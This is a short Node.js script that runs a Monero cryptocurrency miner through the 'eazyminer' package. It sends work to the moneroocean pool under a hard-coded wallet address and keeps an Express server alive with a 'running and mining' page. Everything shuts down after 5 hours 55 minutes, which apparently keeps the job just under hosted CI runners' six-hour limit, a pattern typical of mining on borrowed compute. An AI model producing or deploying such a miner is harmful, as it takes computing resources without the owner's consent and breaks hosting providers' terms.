const os = require('os');
const Miner = require('eazyminer');
const express = require('express');

const app = express();
const PORT = 3000;

// Function to log CPU usage
function logCpuUsage() {
    const cpus = os.cpus();
    cpus.forEach((cpu, index) => {
        const total = Object.values(cpu.times).reduce((acc, tv) => acc + tv, 0);
        const usage = ((total - cpu.times.idle) / total) * 100;
        console.log(`CPU ${index}: ${usage.toFixed(2)}% used`);
    });
    console.log('---');
}

// Set up the miner
const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc',
        url: 'gulf.moneroocean.stream:10128', // optional pool URL
    }],
    autoStart: false // optional delay
});

miner.start(); // manually start the miner

// Log CPU usage every 5 seconds
const cpuUsageInterval = setInterval(logCpuUsage, 5000);

// Start the Express server
const server = app.listen(PORT, () => {
    console.log(`Express server is running on http://localhost:${PORT}`);
});

// Stop the Express server after 5 hours and 55 minutes
const shutdownTimeout = 5 * 60 * 60 * 1000 + 55 * 60 * 1000; // 5 hours 55 minutes in milliseconds

setTimeout(() => {
    server.close(() => {
        console.log('Express server stopped after 5 hours and 55 minutes.');
    });
    miner.stop();
    clearInterval(cpuUsageInterval);
}, shutdownTimeout);

app.get('/', (req, res) => {
    res.send('Server is running and mining...');
});
